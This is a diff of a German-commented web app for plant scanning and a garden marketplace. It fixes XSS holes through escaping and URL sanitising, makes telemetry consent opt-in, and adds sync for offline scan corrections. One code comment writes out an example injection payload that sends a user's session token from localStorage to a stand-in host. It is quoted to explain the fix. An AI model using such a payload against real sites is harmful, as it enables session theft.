@@ -1650,6 +1650,20 @@ button, a, [role="button"], .settings-row, .mp-add-btn, .modal-close-btn, [oncli
   } catch(_) {}
 })();
 
+// v30.80 · revDSG (CLAUDE.md §3.7): EINE Stelle, die „darf ich Telemetrie senden?"
+// beantwortet. Opt-IN — ohne ausdrueckliches true wird nichts gesendet. Bewusst
+// default-deny: fehlt der Key (Consent-Banner noch nicht beantwortet), ist die
+// Antwort nein, nicht ja.
+window.gsHasAnalyticsConsent = function(){
+  try {
+    var c = JSON.parse(localStorage.getItem('gs_consent') || 'null');
+    if (c && c.analytics === true) return true;
+    var p = JSON.parse(localStorage.getItem('gs_prefs') || 'null');
+    if (p && p.privacy && p.privacy.analytics === true) return true;
+  } catch(_) {}
+  return false;
+};
+
 // ── Globaler Fehler-Handler (v23.59 erweitert) ──────────────
 // Speichert JS-Fehler + unhandled Promise-Rejects in localStorage
 // für Diagnose. Sichtbar via admin panel → "Error Log anzeigen"
@@ -1663,6 +1677,13 @@ button, a, [role="button"], .settings-row, .mp-add-btn, .modal-close-btn, [oncli
   function reportErrorToServer(entry) {
     try {
       if (_reportCount >= 5) return;
+      // v30.80 revDSG-FIX: lief bisher OHNE jede Consent-Pruefung und sendet user_id +
+      // 500 Zeichen Stacktrace an client_errors. privacy.html sagt dazu ausdruecklich
+      // „nur mit deiner ausdruecklichen Einwilligung (Opt-in)" — und die Daten sind wegen
+      // user_id auch nicht anonym. Jetzt Opt-in gemaess CLAUDE.md §3.7 (gleiche Bedingung
+      // wie fuer Analytics). Der lokale gs_error_log bleibt unberuehrt: rein clientseitig,
+      // verlaesst das Geraet nicht, Admin-Support-Pfad bleibt damit erhalten.
+      if (!(typeof gsHasAnalyticsConsent === 'function' && gsHasAnalyticsConsent())) return;
       var key = String(entry.msg || '').slice(0, 100);
       if (!key || _reported[key]) return;
       if (typeof sbFetch !== 'function' || typeof sbIsLoggedIn !== 'function' || !sbIsLoggedIn()) return;
@@ -20868,9 +20889,12 @@ function renderMarket() {
     var verifiedBadge = l.verified ? '<span style="color:#2e7d32;font-size:11px;margin-left:3px;" title="Verifiziert">✓</span>' : '';
     var reportBadge = (l.reports||0) >= 3 ? '<span style="background:#fff3e0;color:#e65100;font-size:9px;padding:1px 5px;border-radius:4px;font-weight:800;margin-left:4px;">' + _t('badge_reported','⚠️ Gemeldet') + '</span>' : '';
     // v26.36: Bio + Pestizid-frei-Badges
-    var bioBadge = l.organic_certified ? '<span style="background:#e8f5e9;color:#1b5e20;font-size:9.5px;padding:1px 6px;border-radius:5px;font-weight:800;margin-left:3px;" title="Bio-zertifiziert' + (l.certification_label ? ': ' + l.certification_label : '') + '">' + _t('badge_bio','🌱 Bio') + (l.certification_label ? ' (' + _esc(l.certification_label) + ')' : '') + '</span>' : '';
+    var bioBadge = l.organic_certified ? '<span style="background:#e8f5e9;color:#1b5e20;font-size:9.5px;padding:1px 6px;border-radius:5px;font-weight:800;margin-left:3px;" title="Bio-zertifiziert' + (l.certification_label ? ': ' + _esc(l.certification_label) : '') + '">' + _t('badge_bio','🌱 Bio') + (l.certification_label ? ' (' + _esc(l.certification_label) + ')' : '') + '</span>' : '';
     var pfBadge = (!l.organic_certified && l.pesticide_free) ? '<span style="background:#fff8e1;color:#bf360c;font-size:9.5px;padding:1px 6px;border-radius:5px;font-weight:800;margin-left:3px;" title="Pestizid-frei (eigene Aussage)">' + _t('badge_pestfree','🚫 Pestizid-frei') + '</span>' : '';
-    var regionText = l.region && l.region !== 'other' ? l.region : '';
+    // v30.80 XSS-FIX: l.region ging roh in einen Textknoten (`📍 ' + regionText`).
+    // saveListing sendet region ungefiltert, dieselbe Spalte wird an 2 anderen Stellen
+    // (9559, 35880) korrekt escaped — hier war es vergessen.
+    var regionText = l.region && l.region !== 'other' ? _esc(l.region) : '';
     var timeAgo = _timeAgo(l.createdAt);
     // v26.92: Status-Badge (reserved / sold / archived)
     var statusBadge = '';
@@ -20882,7 +20906,7 @@ function renderMarket() {
     html += '<div class="mk-card" onclick="openListingDetail(\'' + l.id + '\')" style="background:var(--card);border:1px solid var(--border);border-radius:12px;padding:11px;margin-bottom:8px;cursor:pointer;-webkit-tap-highlight-color:transparent;display:flex;gap:11px;' + cardDim + '">' +
       // Bild/Icon
       '<div style="width:64px;height:64px;background:var(--g-bg);border-radius:9px;display:flex;align-items:center;justify-content:center;font-size:34px;flex-shrink:0;overflow:hidden;">' +
-        (l.images && l.images[0] ? '<img src="' + l.images[0] + '" alt="" style="width:100%;height:100%;object-fit:cover;">' : catEmoji) +
+        (l.images && l.images[0] ? '<img src="' + _gsImgUrl(l.images[0]) + '" alt="" style="width:100%;height:100%;object-fit:cover;">' : catEmoji) +
       '</div>' +
       // Info
       '<div style="flex:1;min-width:0;">' +
@@ -26401,10 +26425,21 @@ window.gsScanHistoryReportWrong = async function(idx) {
       }
     });
   } else {
-    // Lokal queuen
+    // Lokal queuen — Drain via gsDrainScanCorrections() beim nächsten Login.
+    // v30.80: Feldnamen an das ECHTE scan_corrections-Schema angeglichen (user_name,
+    // ai_confidence, context) — der alte 'correct_name' ist exakt die nicht-existente
+    // Spalte, die v29.07 im Online-Pfad schon einmal gefixt hat. Plus §3.5-Rotation.
     try {
       var q = JSON.parse(localStorage.getItem('gs_scan_corrections_queue')||'[]');
-      q.push({ai_name:e.name, ai_latin:e.latin||'', correct_name:correctName.trim(), ts:Date.now()});
+      if (!Array.isArray(q)) q = [];
+      q.push({
+        ai_name: e.name,
+        ai_latin: e.latin || null,
+        user_name: correctName.trim(),
+        ai_confidence: e.conf || null,
+        context: e.ts ? { scan_ts: new Date(e.ts).toISOString() } : {}
+      });
+      if (q.length > 50) q = q.slice(-50);
       localStorage.setItem('gs_scan_corrections_queue', JSON.stringify(q));
       if (typeof showProfileToast === 'function') {
         showProfileToast({type:'info', icon:'💾', title:'Korrektur lokal gespeichert', body:'Wird beim nächsten Login synchronisiert.', duration:4000});
@@ -27422,6 +27457,13 @@ window.gsHTMLEscape = function(s){ return String(s==null?'':s).replace(/[&<>"']/
   gsSafeHTML.GsSafeString = GsSafeString;
   window.gsSafeHTML = gsSafeHTML;
 })();
+
+// v30.80: Kurz-Helfer fuer `<img src="…">` aus Fremd-Daten (Supabase-Zeilen anderer User).
+// Liefert eine escapte http/https/relative URL oder '' — nie ein ausbrechendes Attribut.
+// Bewusst function-Declaration (gehoisted): Aufrufer stehen im File WEIT oberhalb dieser
+// Zeile, eine `window.x = function`-Zuweisung waere dort noch undefined.
+function _gsImgUrl(u){ return window.gsSafeHTML.url(u); }
+window._gsImgUrl = _gsImgUrl;
 
 function togglePlantCard(id){
   const expand = document.getElementById('expand-' + id);
@@ -31219,7 +31261,11 @@ function renderSocialFeed() {
     out += '<div style="font-weight:800;font-size:13.5px;color:var(--text);">' + nameHtml + exp + vBadge + '</div>';
     out += '<div style="font-size:11px;color:var(--muted);">' + dt + (plant ? ' · 🌿 ' + escHtml(plant) : '') + '</div>';
     out += '</div>';
-    out += '<span style="font-size:16px;" title="' + (p.type||p.category||'fund') + '">' + emoji + '</span>';
+    // v30.80 XSS-FIX: p.category kommt roh aus social_posts (submitInlinePost POSTet einen
+    // frei waehlbaren String) und ging ungeescaped ins title-Attribut → voller Tag-Breakout,
+    // feuerte ohne Interaktion beim Oeffnen des Community-Tabs. Alle Nachbarfelder wurden
+    // im v29.09-Pass escaped, dieses eine nicht.
+    out += '<span style="font-size:16px;" title="' + escHtml(p.type||p.category||'fund') + '">' + emoji + '</span>';
     out += '</div>';
     // v23.74: Foto (von Storage oder optimistic-base64)
     var photo = p.photo_url || p.image || null;
@@ -35838,10 +35884,10 @@ function gsMarketShowDetail(l) {
   // Bilder-Galerie (1 großes Bild + Thumbnails)
   var galleryHtml = imgs.length
     ? '<div style="margin:0 -16px 14px;">' +
-        '<img id="mklist-main-img" src="' + imgs[0] + '" alt="" style="width:100%;max-height:320px;object-fit:cover;background:var(--surface2);" loading="lazy">' +
+        '<img id="mklist-main-img" src="' + _gsImgUrl(imgs[0]) + '" alt="" style="width:100%;max-height:320px;object-fit:cover;background:var(--surface2);" loading="lazy">' +
         (imgs.length > 1 ? '<div style="display:flex;gap:6px;padding:8px 16px 0;overflow-x:auto;-webkit-overflow-scrolling:touch;">' +
           imgs.map(function(src, i){
-            return '<img onclick="document.getElementById(\'mklist-main-img\').src=\'' + _gsOcArg(src) + '\'" src="' + src + '" alt="" style="width:60px;height:60px;object-fit:cover;border-radius:8px;cursor:pointer;flex-shrink:0;border:2px solid ' + (i===0?'var(--g-main)':'transparent') + ';" loading="lazy">';
+            return '<img onclick="document.getElementById(\'mklist-main-img\').src=\'' + _gsOcArg(src) + '\'" src="' + _gsImgUrl(src) + '" alt="" style="width:60px;height:60px;object-fit:cover;border-radius:8px;cursor:pointer;flex-shrink:0;border:2px solid ' + (i===0?'var(--g-main)':'transparent') + ';" loading="lazy">';
           }).join('') +
         '</div>' : '') +
       '</div>'
@@ -45791,9 +45837,13 @@ async function gsAddMarker(lat, lng) {
 
 // v26.84: Gemeinsamer Popup-HTML-Builder für Marker (live + reload)
 function _gsBuildFindPopup(catMeta, name, note, dateObj, photoUrl){
+  // v30.80 XSS-FIX: photoUrl kam aus greenscan_markers, das gsLoadMarkersFromCloud mit
+  // fremden Cloud-Zeilen befuellt → die Injection ueberlebte im localStorage und feuerte
+  // bei JEDEM App-Start neu, auch offline. Gleiche Absicherung wie im Cloud-Popup.
   var photoBlock = '';
-  if (photoUrl) {
-    photoBlock = '<div style="margin-bottom:6px;text-align:center;"><img src="' + photoUrl + '" style="max-width:100%;max-height:140px;border-radius:6px;border:1px solid #c8e6c9;" alt="" loading="lazy"></div>';
+  var _pu = (window.gsSafeHTML && gsSafeHTML.url) ? gsSafeHTML.url(photoUrl) : '';
+  if (_pu) {
+    photoBlock = '<div style="margin-bottom:6px;text-align:center;"><img src="' + _pu + '" style="max-width:100%;max-height:140px;border-radius:6px;border:1px solid #c8e6c9;" alt="" loading="lazy"></div>';
   }
   return '<div style="font-size:13px;">' + photoBlock +
     '<b style="color:#1a3d1a;">' + catMeta.emoji + ' ' + escHtml(name || '') + '</b>' +
@@ -45847,9 +45897,16 @@ async function gsLoadMarkersFromCloud() {
       var icon = _gsCatIcon(markerCat, true);
       var d = new Date(row.found_at || row.created_at || Date.now());
       // v26.84: Cloud-Popup mit Foto wenn vorhanden + Cloud-Marker-Hinweis
+      // v30.80 XSS-FIX: row.photo_url ging ROH in src="" — und der Pull oben holt via
+      // select=* ALLE Community-Funde, nicht nur eigene. Jeder User kann photo_url auf
+      // seiner EIGENEN Zeile per PATCH setzen (macht _gsMyFindAddPhoto genauso) und mit
+      // is_private:false teilen → `x" onerror=fetch('//evil/?'+localStorage.gs_sb_token)`
+      // lief bei jedem, der den Marker antippt. species_name/note waren escaped, nur
+      // photo_url nicht. gsSafeHTML.url() erzwingt http/https/mailto/relativ + escaped.
       var photoBlock = '';
-      if (row.photo_url) {
-        photoBlock = '<div style="margin-bottom:6px;text-align:center;"><img src="' + row.photo_url + '" style="max-width:100%;max-height:140px;border-radius:6px;border:1px solid #c8e6c9;" alt="" loading="lazy"></div>';
+      var _pu = (window.gsSafeHTML && gsSafeHTML.url) ? gsSafeHTML.url(row.photo_url) : '';
+      if (_pu) {
+        photoBlock = '<div style="margin-bottom:6px;text-align:center;"><img src="' + _pu + '" style="max-width:100%;max-height:140px;border-radius:6px;border:1px solid #c8e6c9;" alt="" loading="lazy"></div>';
       }
       var marker = L.marker([row.lat, row.lng], { icon: icon }).addTo(gsMap).bindPopup(
         '<div style="font-size:13px;">' + photoBlock +
@@ -74860,10 +74917,11 @@ async function gsAddGardenTask(task){
 // ── ANALYTICS (anonymisiert, nur bei User-Consent) ──────────────────────────
 window.gsTrackEvent = function(event, props){
   try {
-    // Nur tracken wenn Consent vorhanden (user_preferences.analytics === true)
-    var prefs = {};
-    try { prefs = JSON.parse(gsStore.get('gs_prefs', null)||'{}'); } catch(_){}
-    if (prefs && prefs.privacy && prefs.privacy.analytics === false) return;
+    // v30.80 revDSG-FIX: war opt-OUT (`=== false`) statt opt-IN, UND der geprüfte Pfad
+    // gs_prefs.privacy.analytics wird nirgends im Code geschrieben → die Bedingung konnte
+    // nie greifen, effektiv „immer senden". CLAUDE.md §3.7 verlangt ausdrückliches true.
+    // Jetzt dieselbe Opt-in-Quelle wie beim Error-Reporting.
+    if (!(typeof gsHasAnalyticsConsent === 'function' && gsHasAnalyticsConsent())) return;
     if (typeof sbFetch !== 'function') return;
     var uid = gsStore.get('gs_sb_uid', null) || null;
     sbFetch('/rest/v1/analytics_events', {
@@ -74920,6 +74978,49 @@ async function gsOpenRedeemVoucher(){
 }
 window.gsOpenRedeemVoucher = gsOpenRedeemVoucher;
 
+// v30.80: Offline gemeldete Scan-Korrekturen nachreichen.
+// gsScanHistoryReportWrong queute sie seit v24.10 unter gs_scan_corrections_queue und
+// versprach im Toast „Wird beim nächsten Login synchronisiert" — es gab aber NIE einen
+// Leser für den Key. Jede offline gemeldete Korrektur ging still verloren, die Queue
+// wuchs unbegrenzt weiter. Erst nach bestätigtem POST wird der Eintrag verworfen.
+async function gsDrainScanCorrections(){
+  if (typeof sbIsLoggedIn !== 'function' || !sbIsLoggedIn() || typeof sbFetch !== 'function') return 0;
+  var uid = gsStore.get('gs_sb_uid', null);
+  if (!uid) return 0;
+  var q;
+  try { q = JSON.parse(localStorage.getItem('gs_scan_corrections_queue') || '[]'); } catch(_){ q = []; }
+  if (!Array.isArray(q) || !q.length) return 0;
+
+  var rest = [], sent = 0;
+  for (var i = 0; i < q.length; i++) {
+    var it = q[i];
+    if (!it || !it.ai_name || !it.user_name) continue;  // Schrott aus alten Versionen verwerfen
+    var r = await sbFetch('/rest/v1/scan_corrections', {
+      method: 'POST',
+      headers: {'Content-Type':'application/json','Prefer':'return=minimal'},
+      body: JSON.stringify({
+        user_id: uid,
+        ai_name: it.ai_name,
+        ai_latin: it.ai_latin || null,
+        user_name: it.user_name,
+        ai_confidence: it.ai_confidence || null,
+        context: it.context || {}
+      })
+    }).catch(function(){ return { error: { message: 'network' } }; });
+    if (r && r.error) rest.push(it); else sent++;
+  }
+
+  try {
+    if (rest.length) localStorage.setItem('gs_scan_corrections_queue', JSON.stringify(rest));
+    else localStorage.removeItem('gs_scan_corrections_queue');
+  } catch(_){}
+  if (sent && typeof showProfileToast === 'function') {
+    showProfileToast({type:'success', icon:'🙏', title:'Korrekturen synchronisiert', body:sent + ' offline gemeldete Korrektur(en) übertragen.', duration:4000});
+  }
+  return sent;
+}
+window.gsDrainScanCorrections = gsDrainScanCorrections;
+
 // ═══ ERWEITERT: gsSyncUserDataOnLogin zieht jetzt ALLES ═══
 var _gsOrigSyncOnLogin = window.gsSyncUserDataOnLogin;
 window.gsSyncUserDataOnLogin = async function(){
@@ -74932,7 +75033,9 @@ window.gsSyncUserDataOnLogin = async function(){
       // v23.76: Rolle vom Server pullen
       gsSyncUserRole().catch(function(){}),
       // v23.77: Globalen API-Key pullen (admin → alle)
-      gsPullGlobalApiKey().catch(function(){})
+      gsPullGlobalApiKey().catch(function(){}),
+      // v30.80: offline gequeuete Scan-Korrekturen nachreichen
+      gsDrainScanCorrections().catch(function(){})
     ]);
   } catch(e){ console.warn('[gsSyncUserDataOnLogin-extended]', e); }
 };
